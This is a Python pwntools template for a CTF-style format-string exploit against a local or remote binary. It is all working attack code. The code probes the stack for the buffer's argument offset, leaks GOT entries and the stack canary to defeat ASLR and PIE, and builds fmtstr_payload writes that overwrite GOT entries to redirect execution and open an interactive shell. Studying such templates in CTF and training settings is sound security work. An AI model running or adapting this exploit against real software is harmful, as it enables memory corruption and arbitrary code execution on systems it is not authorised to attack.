#!/usr/bin/env python3
"""
Format-string exploitation pwntools template.

PURPOSE
-------
Full three-phase format-string exploit:

  Phase 1 — Probe the stack to find which argument index corresponds to the
             format-string buffer (``%1$p``, ``%2$p``, …).
  Phase 2 — Leak stack / GOT values to defeat ASLR / PIE.
  Phase 3 — Arbitrary write (GOT overwrite or saved-RIP overwrite) using
             pwntools ``fmtstr_payload``.

USAGE
-----
1.  Fill in the CONFIG block below.
2.  Run:  python3 format_string.py
3.  Set REMOTE = True and fill in host/port for remote exploitation.

REQUIREMENTS
------------
    pip install pwntools

REFERENCES
----------
* https://docs.pwntools.com/en/stable/fmtstr.html
* https://axcheron.github.io/exploit-101-format-strings/

AUTHOR: Sentinel CTF Framework
"""

# =============================================================================
# CONFIG
# =============================================================================

EXE_PATH    = "./vuln"
REMOTE_HOST = "chall.example.com"
REMOTE_PORT = 1337
REMOTE      = False

# Maximum number of argument positions to probe in Phase 1.
MAX_PROBE_DEPTH = 80

# Known format-string argument offset (set after Phase 1 to skip probing).
KNOWN_FMTSTR_OFFSET: int | None = None   # e.g. 14

# =============================================================================

from pwn import (  # type: ignore  # noqa: E402
    ELF,
    FmtStr,
    context,
    flat,
    fmtstr_payload,
    log,
    p64,
    process,
    remote,
    u64,
)

# ---------------------------------------------------------------------------
# Binary setup
# ---------------------------------------------------------------------------

elf              = ELF(EXE_PATH, checksec=True)
context.binary   = elf
context.log_level = "info"

# ---------------------------------------------------------------------------
# Connection helper
# ---------------------------------------------------------------------------

def connect():
    """Return a pwntools tube for the target."""
    if REMOTE:
        log.info(f"Connecting to {REMOTE_HOST}:{REMOTE_PORT}")
        return remote(REMOTE_HOST, REMOTE_PORT)
    log.info(f"Spawning {EXE_PATH}")
    return process(EXE_PATH)


# ---------------------------------------------------------------------------
# Helper: send one format string and get response
# ---------------------------------------------------------------------------

def send_fmt(fmt: bytes, *, recvuntil: bytes = b">") -> bytes:
    """
    Open a fresh connection, send *fmt*, and return the response.

    Adapt the ``recvuntil`` prompt and the send sequence to your binary.
    """
    io = connect()
    io.recvuntil(recvuntil)
    io.sendline(fmt)
    response = io.recvall(timeout=2)
    io.close()
    return response


# ---------------------------------------------------------------------------
# Phase 1: find format-string argument offset
# ---------------------------------------------------------------------------

def find_fmtstr_offset() -> int:
    """
    Probe the stack to determine which ``%n$p`` index leaks the AAAA marker.

    Sends ``AAAA%{i}$p`` for i in 1 .. MAX_PROBE_DEPTH.  When the response
    contains ``0x41414141`` (32-bit) or ``0x4141414141414141`` (64-bit), the
    offset is found.

    Returns
    -------
    int
        The format-string argument index of the controlled buffer.

    Raises
    ------
    RuntimeError
        If the marker is not found within MAX_PROBE_DEPTH iterations.
    """
    if KNOWN_FMTSTR_OFFSET is not None:
        log.success(f"Using hard-coded offset: {KNOWN_FMTSTR_OFFSET}")
        return KNOWN_FMTSTR_OFFSET

    MARKER_64 = b"0x4141414141414141"
    MARKER_32 = b"0x41414141"

    log.info(f"Probing up to {MAX_PROBE_DEPTH} stack positions...")
    for i in range(1, MAX_PROBE_DEPTH + 1):
        fmt      = f"AAAA%{i}$p".encode()
        response = send_fmt(fmt)
        if MARKER_64 in response or MARKER_32 in response:
            log.success(f"Format-string offset found: {i}")
            return i
        log.debug(f"  [{i:3d}] {response[:80]!r}")

    raise RuntimeError(
        f"Format-string offset not found within {MAX_PROBE_DEPTH} positions. "
        "Try increasing MAX_PROBE_DEPTH or adjusting the send sequence."
    )


# ---------------------------------------------------------------------------
# Phase 2: leak values (stack / GOT / libc)
# ---------------------------------------------------------------------------

def leak_got_value(fmtstr_offset: int, got_addr: int) -> int:
    """
    Leak the 8-byte value stored at *got_addr* via ``%{n}$s``.

    The GOT address is prepended to the payload as an 8-byte pointer.
    On 64-bit systems the null bytes in high addresses can interfere —
    use ``%{n}$p`` + padding tricks if ``%s`` fails.

    Parameters
    ----------
    fmtstr_offset:
        Argument index of the controlled buffer (from :func:`find_fmtstr_offset`).
    got_addr:
        GOT entry address to leak (e.g. ``elf.got['puts']``).

    Returns
    -------
    int
        The 8-byte runtime pointer stored in the GOT entry.
    """
    # The 8-byte address is the first thing in our buffer.
    # It occupies 1 stack slot (8 bytes on x64), so we use fmtstr_offset
    # directly for reading it.
    addr_bytes = p64(got_addr)
    fmt        = f"%{fmtstr_offset}$s".encode()
    payload    = addr_bytes + fmt

    io = connect()
    io.recvuntil(b">")
    io.sendline(payload)
    raw = io.recv(8)
    io.close()

    leak = u64(raw.ljust(8, b"\x00"))
    log.success(f"GOT[{got_addr:#x}] = {leak:#x}")
    return leak


def leak_stack_canary(fmtstr_offset: int, canary_stack_index: int) -> int:
    """
    Leak the stack canary using a direct ``%{n}$p`` read.

    Parameters
    ----------
    fmtstr_offset:
        Base argument index of the buffer.
    canary_stack_index:
        Stack slot offset from the buffer base to the canary slot.
        Determine this empirically with Phase 1 probing.

    Returns
    -------
    int
        The 8-byte canary value.
    """
    idx  = fmtstr_offset + canary_stack_index
    fmt  = f"%{idx}$p".encode()
    resp = send_fmt(fmt)
    # Parse '0xCAFEBABE...' from response
    for token in resp.split():
        if token.startswith(b"0x") and len(token) == 18:
            canary = int(token, 16)
            log.success(f"Stack canary: {canary:#x}")
            return canary
    raise ValueError(f"Could not parse canary from response: {resp!r}")


# ---------------------------------------------------------------------------
# Phase 3: arbitrary write via fmtstr_payload
# ---------------------------------------------------------------------------

def build_write_payload(
    fmtstr_offset: int,
    target_addr: int,
    new_value: int,
) -> bytes:
    """
    Build a format-string write payload using pwntools ``fmtstr_payload``.

    Writes *new_value* to *target_addr*.  Common targets:

    * ``elf.got['puts']``     → redirect puts() to win() or one_gadget
    * ``elf.got['exit']``     → hijack exit()
    * Saved return address on the stack (requires stack leak first)

    Parameters
    ----------
    fmtstr_offset:
        Argument index of the controlled buffer.
    target_addr:
        Address to overwrite.
    new_value:
        Value to write (e.g. address of win function or one_gadget).

    Returns
    -------
    bytes
        Raw format-string payload.
    """
    payload = fmtstr_payload(
        fmtstr_offset,
        {target_addr: new_value},
        write_size="byte",    # byte-by-byte writes are most reliable
    )
    log.info(
        f"fmtstr_payload: writing {new_value:#x} → {target_addr:#x} "
        f"({len(payload)} bytes)"
    )
    return payload


# ---------------------------------------------------------------------------
# Pwntools FmtStr class wrapper (interactive helper)
# ---------------------------------------------------------------------------

def auto_exploit_with_fmtstr_class(
    fmtstr_offset: int,
    target_addr: int,
    new_value: int,
) -> None:
    """
    Use pwntools ``FmtStr`` helper for fully automated format-string write.

    ``FmtStr`` automatically calibrates and sends payloads.  It is
    especially useful when the binary loops (calls ``printf`` multiple
    times).

    Parameters
    ----------
    fmtstr_offset:
        Known argument index of the buffer.
    target_addr:
        Memory address to overwrite.
    new_value:
        New value to write to *target_addr*.
    """
    io = connect()

    def exec_fmt(payload: bytes) -> bytes:
        """Callback: send payload and return binary response."""
        io.recvuntil(b">")
        io.sendline(payload)
        return io.recvuntil(b">", drop=True)

    fmt_obj = FmtStr(exec_fmt, offset=fmtstr_offset)
    fmt_obj.write(target_addr, new_value)
    fmt_obj.execute_writes()

    log.success("Write complete — dropping into shell")
    io.interactive()
    io.close()


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def exploit() -> None:
    """
    Full format-string exploit flow.

    Adjust the function calls below to match your target's vulnerability
    surface (single-shot vs. loop, GOT-overwrite vs. stack overwrite, etc.).
    """
    # ----- Phase 1 -----
    offset = find_fmtstr_offset()
    log.info(f"Format-string offset: {offset}")

    # ----- Phase 2: leak libc/pie (if needed) -----
    # Example: leak puts@libc to defeat ASLR
    # puts_leak  = leak_got_value(offset, elf.got["puts"])
    # libc.address = puts_leak - libc.sym["puts"]
    # log.success(f"libc base: {libc.address:#x}")

    # ----- Phase 3: overwrite GOT -----
    # Example: redirect puts → win function
    win_addr = elf.sym.get("win") or elf.sym.get("flag") or 0xDEADBEEF
    if win_addr == 0xDEADBEEF:
        log.warning("No 'win'/'flag' symbol found — set win_addr manually!")
        return

    payload = build_write_payload(offset, elf.got["puts"], win_addr)

    io = connect()
    io.recvuntil(b">")
    io.sendline(payload)

    # Trigger the overwritten puts to land on win:
    io.recvuntil(b">")
    io.sendline(b"trigger")   # send whatever causes puts() to be called

    log.success("Exploit sent — waiting for flag...")
    flag_line = io.recvall(timeout=3)
    log.success(f"Response: {flag_line!r}")
    io.close()


def main() -> None:
    """Entry point."""
    exploit()


if __name__ == "__main__":
    main()
